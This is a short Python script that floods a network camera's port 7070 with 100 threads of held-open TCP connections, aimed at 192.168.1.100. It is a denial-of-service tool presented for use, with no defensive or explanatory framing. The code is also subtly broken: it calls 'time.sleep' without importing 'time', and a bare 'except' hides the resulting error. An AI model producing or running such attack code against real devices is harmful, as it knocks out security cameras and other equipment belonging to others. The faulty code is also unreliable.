import socket
import threading

def flood_7070(camera_ip):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((camera_ip, 7070))
            # Keep connection open
            time.sleep(300)  # 5 minutes per connection
        except:
            pass

# Launch multiple threads
for _ in range(100):  # 100 concurrent connections
    threading.Thread(target=flood_7070, args=("192.168.1.100",)).start()
